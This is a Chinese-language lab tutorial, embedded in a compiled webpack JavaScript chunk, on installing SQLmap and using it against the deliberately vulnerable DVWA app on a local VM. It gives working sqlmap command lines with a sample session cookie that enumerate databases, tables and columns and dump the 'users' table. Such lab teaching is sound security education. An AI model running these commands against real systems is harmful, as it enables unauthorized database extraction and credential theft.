(window.webpackJsonp=window.webpackJsonp||[]).push([[83],{465:function(s,t,a){"use strict";a.r(t);var e=a(2),v=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("前言")]),s._v(" "),a("p",[s._v("此系列笔记是网络渗透工具的使用方法, 本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具, 有一个非常棒的特性, 即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）")])]),s._v(" "),a("h2",{attrs:{id:"sqlmap-环境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap-环境"}},[s._v("#")]),s._v(" SQLmap 环境")]),s._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),a("p",[s._v("由于 "),a("code",[s._v("kali Liunx")]),s._v(" 已经集成了 SQLmap 的环境, 这里就直接介绍 "),a("code",[s._v("Windows")]),s._v(" 下环境的构建。")])]),s._v(" "),a("h3",{attrs:{id:"先安装-python"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#先安装-python"}},[s._v("#")]),s._v(" 先安装 Python")]),s._v(" "),a("p",[s._v("正常情况下我们安装 "),a("code",[s._v("2.7.x")]),s._v(" 就好了。")]),s._v(" "),a("p",[a("a",{attrs:{href:"http://www.python.org/getit/",target:"_blank",rel:"noopener noreferrer"}},[s._v("Python 官网下载地址"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("接下来只需在环境变量 "),a("code",[s._v("path")]),s._v(" 中添加 Python 的安装路径就好了。"),a("br")]),s._v(" "),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-1.png",alt:"SQLmap"}})]),s._v(" "),a("h3",{attrs:{id:"再安装-sqlmap"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#再安装-sqlmap"}},[s._v("#")]),s._v(" 再安装 SQLmap")]),s._v(" "),a("p",[a("a",{attrs:{href:"http://sqlmap.org/",target:"_blank",rel:"noopener noreferrer"}},[s._v("SQLmap 官网下载地址"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("将 SQLmap 解压至 Python 目录下, 将 SQLmap 的程序目录重命名为 sqlmap。")]),s._v(" "),a("h4",{attrs:{id:"在桌面新建快捷方式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在桌面新建快捷方式"}},[s._v("#")]),s._v(" 在桌面新建快捷方式")]),s._v(" "),a("p",[a("code",[s._v("For Example:")])]),s._v(" "),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-2.png",alt:"SQLmap"}})]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-3.png",alt:"SQLmap"}})]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-4.png",alt:"SQLmap"}})]),s._v(" "),a("h2",{attrs:{id:"dvwa-环境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#dvwa-环境"}},[s._v("#")]),s._v(" DVWA 环境")]),s._v(" "),a("p",[s._v("DVWA(Dam Vulnerable Web Application) 使用 "),a("code",[s._v("PHP+Mysql")]),s._v(" 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。")]),s._v(" "),a("p",[a("a",{attrs:{href:"http://github.com/ethicalhack3r/DVWA",target:"_blank",rel:"noopener noreferrer"}},[s._v("DVWA GitHub 下载地址"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("在 "),a("code",[s._v("Windows")]),s._v(" 下还需安装 "),a("code",[s._v("PHP")]),s._v(" 环境, 这里推介两个 "),a("code",[s._v("PHP")]),s._v(" 集成环境。")]),s._v(" "),a("p",[a("a",{attrs:{href:"http://www.upupw.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("upupw PHP 集成环境"),a("OutboundLink")],1),s._v(" "),a("a",{attrs:{href:"http://www.phpstudy.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("phpStudy PHP 集成环境"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("接下来只需修改一下配置文件就好了。")]),s._v(" "),a("h2",{attrs:{id:"sqlmap-使用方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap-使用方法"}},[s._v("#")]),s._v(" SQlmap 使用方法")]),s._v(" "),a("p",[a("code",[s._v("Windows")]),s._v(" 下跟 "),a("code",[s._v("kali Liunx")]),s._v(" 下使用方法不相同。")]),s._v(" "),a("p",[s._v("为方便演示, 我们创建两个虚拟机:")]),s._v(" "),a("ul",[a("li",[s._v("受害者机器, "),a("code",[s._v("Windows 2003")]),s._v(" 操作系统, 运行一个 WEB 服务器, 同时跑着一个包含漏洞的 WEB 应用（DVWA）。")]),s._v(" "),a("li",[s._v("攻击器机器, 使用 "),a("code",[s._v("kali Liunx")]),s._v(" 或者其他版本的 "),a("code",[s._v("Windows")]),s._v(" 包含 SQLmap 程序。")])]),s._v(" "),a("p",[s._v("本次实验的目的: 使用 SQLmap 得到以下信息:")]),s._v(" "),a("ul",[a("li",[s._v("枚举 MYSQL 用户名与密码。")]),s._v(" "),a("li",[s._v("枚举所有数据库。")]),s._v(" "),a("li",[s._v("枚举指定数据库的数据表。")]),s._v(" "),a("li",[s._v("枚举指定数据表中的所有用户名与密码。")])]),s._v(" "),a("h3",{attrs:{id:"查看帮助"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看帮助"}},[s._v("#")]),s._v(" 查看帮助")]),s._v(" "),a("p",[a("code",[s._v("Windows:")]),s._v(" 查看 Python 帮助命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python sqlmap.py -h\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("code",[s._v("kali Liunx:")]),s._v(" 查看 Python 帮助命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -h\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"custom-block warning"},[a("p",{staticClass:"custom-block-title"},[s._v("注意")]),s._v(" "),a("p",[s._v("需要注意的是 "),a("code",[s._v("Windows")]),s._v(" 下的选项和 "),a("code",[s._v("kali Liunx")]),s._v(" 下的选项是一致的, 但是命令是不一致的。在 "),a("code",[s._v("Windows")]),s._v(" 下使用 "),a("code",[s._v("python sqlmap.py")]),s._v(" , 而在 "),a("code",[s._v("kali Liunx")]),s._v(" 下使用的是 "),a("code",[s._v("sqlmap")]),s._v(" 。")])]),s._v(" "),a("h3",{attrs:{id:"选项解释"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#选项解释"}},[s._v("#")]),s._v(" 选项解释")]),s._v(" "),a("ul",[a("li",[a("strong",[s._v("--cookie")]),s._v(' => 设置我们的 cookie 值 "将 DVWA 安全等级设置为 low"')]),s._v(" "),a("li",[a("strong",[s._v("--data")]),s._v(" => 设置 POST 提交的值, 如果是 GET 提交, 不需要此选项")]),s._v(" "),a("li",[a("strong",[s._v("-u")]),s._v(" => 指定目标 URL")]),s._v(" "),a("li",[a("strong",[s._v("-b")]),s._v(" => 获取 DBMS banner")]),s._v(" "),a("li",[a("strong",[s._v("--current-db")]),s._v(" => 获取当前数据库")]),s._v(" "),a("li",[a("strong",[s._v("--current-user")]),s._v(" => 获取当前数据库的用户")]),s._v(" "),a("li",[a("strong",[s._v("--tables")]),s._v(" => 获取数据库里所有的表名")]),s._v(" "),a("li",[a("strong",[s._v("--columns")]),s._v(" => 获取表里的所有字段")]),s._v(" "),a("li",[a("strong",[s._v("--dump")]),s._v(" => 获取值")]),s._v(" "),a("li",[a("strong",[s._v("--current-user")]),s._v(" => 获取当前用户")]),s._v(" "),a("li",[a("strong",[s._v("-D")]),s._v(" => 爆库指定数据库名")]),s._v(" "),a("li",[a("strong",[s._v("-T")]),s._v(" => 爆库指定表名")]),s._v(" "),a("li",[a("strong",[s._v("-C")]),s._v(" => 爆库指定字段名")]),s._v(" "),a("li",[a("strong",[s._v("--string")]),s._v(" => 当查询可用时用来匹配页面中的字符串")]),s._v(" "),a("li",[a("strong",[s._v("--users")]),s._v(" => 枚举 DBMS 用户")]),s._v(" "),a("li",[a("strong",[s._v("--password")]),s._v(" => 枚举 DBMS 用户密码 hash")]),s._v(" "),a("li",[a("strong",[s._v("--dbs")]),s._v(" => 枚举 DBMS 中的数据库")])]),s._v(" "),a("h2",{attrs:{id:"开始爆库"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#开始爆库"}},[s._v("#")]),s._v(" 开始爆库")]),s._v(" "),a("p",[s._v("由于 "),a("code",[s._v("Windows")]),s._v(" 和 "),a("code",[s._v("kali Liunx")]),s._v(" 的做法基本一致, 这里以 "),a("code",[s._v("kali Liunx")]),s._v(" 为例。DVWA 的难度为 low。")]),s._v(" "),a("h3",{attrs:{id:"先获取-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#先获取-cookie"}},[s._v("#")]),s._v(" 先获取 Cookie")]),s._v(" "),a("p",[s._v("每一次的 Cookie 都不一样, 这里是个示范。")]),s._v(" "),a("p",[a("code",[s._v("For Example:")]),s._v(" "),a("br")]),s._v(" "),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-5.png",alt:"SQLmap"}})]),s._v(" "),a("h3",{attrs:{id:"获取数据库-current-db"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取数据库-current-db"}},[s._v("#")]),s._v(" 获取数据库, --current-db")]),s._v(" "),a("p",[a("code",[s._v("For Example:")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"//192.168.79.132/vulnerabilities/sqli/?id=1&Submit=Submit#"')]),s._v(" --cookie"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"')]),s._v(" --current-db\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 "),a("code",[s._v("--current-db")]),s._v(" 的 "),a("code",[s._v("-")]),s._v(" 可是有两个的。")]),s._v(" "),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-6.png",alt:"SQLmap"}})]),s._v(" "),a("h3",{attrs:{id:"获取表-tables"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取表-tables"}},[s._v("#")]),s._v(" 获取表, --tables")]),s._v(" "),a("p",[s._v("前面, 我们已经获取到数据库名, 这时候我们要指定数据库名。使用 "),a("code",[s._v("-D")]),s._v(" 选项指定数据库名。注意 "),a("code",[s._v("--tables")]),s._v(" 的 "),a("code",[s._v("-")]),s._v(" 可是有两个的。")]),s._v(" "),a("p",[a("code",[s._v("For Example:")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"//192.168.79.132/vulnerabilities/sqli/?id=1&Submit=Submit#"')]),s._v(" --cookie"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"')]),s._v(" -D "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'dvwa'")]),s._v(" --tables\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-7.png",alt:"SQLmap"}})]),s._v(" "),a("h3",{attrs:{id:"获取字段-columns"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取字段-columns"}},[s._v("#")]),s._v(" 获取字段, --columns")]),s._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),a("p",[s._v("前面, 我们已经获取到数据库名和表名了, 这时候我们要指定数据库名和表名。使用 "),a("code",[s._v("-D")]),s._v(" 选项指定数据库名, 使用 "),a("code",[s._v("-T")]),s._v(" 指定表名。这里我们选择表 "),a("code",[s._v("users")]),s._v(" 。注意 "),a("code",[s._v("--columns")]),s._v(" 的 "),a("code",[s._v("-")]),s._v(" 可是有两个的。")])]),s._v(" "),a("p",[a("code",[s._v("For Example:")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"//192.168.79.132/vulnerabilities/sqli/?id=1&Submit=Submit#"')]),s._v(" --cookie"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"')]),s._v(" -D "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'dvwa'")]),s._v(" -T "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'users'")]),s._v(" --columns\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-8.png",alt:"SQLmap"}})]),s._v(" "),a("h3",{attrs:{id:"获取数据-dump"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取数据-dump"}},[s._v("#")]),s._v(" 获取数据, --dump")]),s._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),a("p",[s._v("前面, 我们已经获取到数据库名、表名还有字段名了, 这时候我们要指定数据库名、表名还有字段名。使用 "),a("code",[s._v("-D")]),s._v(" 选项指定数据库名, 使用 "),a("code",[s._v("-T")]),s._v(" 指定表名, 使用 "),a("code",[s._v("-C")]),s._v(" 指定字段名。这里我们选择表 "),a("code",[s._v("users")]),s._v(" 中的字段 "),a("code",[s._v("user_id")]),s._v(" 。注意 "),a("code",[s._v("--dump")]),s._v(" 的 "),a("code",[s._v("-")]),s._v(" 可是有两个的。")])]),s._v(" "),a("p",[a("code",[s._v("For Example:")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"//192.168.79.132/vulnerabilities/sqli/?id=1&Submit=Submit#"')]),s._v(" --cookie"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"')]),s._v(" -D "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'dvwa'")]),s._v(" -T "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'users'")]),s._v(" -C "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'user_id'")]),s._v(" --dump\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"http://oss-blog.test.upcdn.net/sqlmap-9.png",alt:"SQLmap"}})])])}),[],!1,null,null,null);t.default=v.exports}}]);